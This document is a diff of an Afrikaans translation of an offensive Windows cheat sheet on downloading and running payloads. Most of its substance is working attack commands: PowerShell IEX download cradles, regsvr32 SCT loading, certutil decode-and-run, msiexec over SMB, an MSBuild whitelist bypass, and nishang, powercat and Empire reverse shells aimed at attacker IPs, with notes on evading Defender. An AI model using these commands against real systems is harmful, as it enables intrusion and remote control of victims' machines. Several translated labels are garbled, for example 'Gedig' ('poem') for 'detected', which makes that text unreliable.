@@ -82,7 +82,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Proses wat netwerkoproep uitvoer: **powershell.exe**\
-Payload op skyf geskryf: **NEE** (_ten minste nêrens waar ek kon vind met procmon !_ )
+Payload op skyf geskryf: **NEE** (_ten minste nêrens waar ek met procmon kon vind!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -219,12 +219,12 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Gedeelte deur verdediger**
+**Gedig deur verdediger**
 
 #### Regsvr32 -sct
 
 [**Van hier**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -249,7 +249,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer met die stager regsvr**
+**Jy kan 'n Koadic zombie baie maklik aflaai en uitvoer met die stager regsvr**
 
 ## Certutil
 
@@ -263,7 +263,7 @@ Laai 'n B64exe af, dekodeer dit en voer dit uit.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Gedig deur verdediger**
+**Gedeelte deur verdediger**
 
 ## **Cscript/Wscript**
 ```bash
@@ -289,7 +289,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Gedeelte deur verdediger**
+**Gedig deur verdediger**
 
 ## **MSIExec**
 
@@ -302,7 +302,7 @@ Slachtoffer:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Gedig**
+**Gevind**
 
 ## **Wmic**
 
@@ -332,7 +332,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Jy kan hierdie tegniek gebruik om Toepassing Witlys en Powershell.exe beperkings te omseil. Aangesien jy met 'n PS-skaal gevra sal word.\
+Jy kan hierdie tegniek gebruik om Toepassing Witlys en Powershell.exe beperkings te omseil. Aangesien jy met 'n PS-skal gevra sal word.\
 Laai net dit af en voer dit uit: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -341,11 +341,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kompileer C# kode op die slagoffer masjien.
+Kompileer C# kode in die slagoffer masjien.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Jy kan 'n basiese C# reverse shell van hier aflaai: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+U kan 'n basiese C# reverse shell hier aflaai: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nie gedetekteer nie**
 
@@ -375,11 +375,11 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-In die **Skale** gids, is daar 'n klomp verskillende skale. Om Invoke-_PowerShellTcp.ps1_ af te laai en uit te voer, maak 'n kopie van die skrip en voeg by die einde van die lêer:
+In die **Skale** gids, is daar 'n baie verskillende skale. Om Invoke-_PowerShellTcp.ps1_ af te laai en uit te voer, maak 'n kopie van die skrif en voeg by die einde van die lêer:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Begin om die skrip in 'n webbediener te bedien en voer dit aan die slagoffer se kant uit:
+Begin om die skrip op 'n webbediener te bedien en voer dit aan die slagoffer se kant uit:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -391,7 +391,7 @@ Defender detecteer dit nie as kwaadwillige kode nie (nog, 3/04/2019).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Laai af, begin 'n webbediener, begin die luisteraar, en voer dit op die slagoffer se kant uit:
+Laai af, begin 'n webbediener, begin die luisteraar, en voer dit aan die slagoffer se kant uit:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -420,7 +420,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Skep 'n powershell-lanser, stoor dit in 'n lêer en laai dit af en voer dit uit.
+Skep 'n powershell-lancer, stoor dit in 'n lêer en laai dit af en voer dit uit.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -447,7 +447,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ## Meer
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS-konsol met 'n paar offensiewe PS-modules vooraf gelaai (gecyfer)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsol met 'n paar offensiewe PS-modules en proxy-detektering (IEX)
 
 ## Verwysings
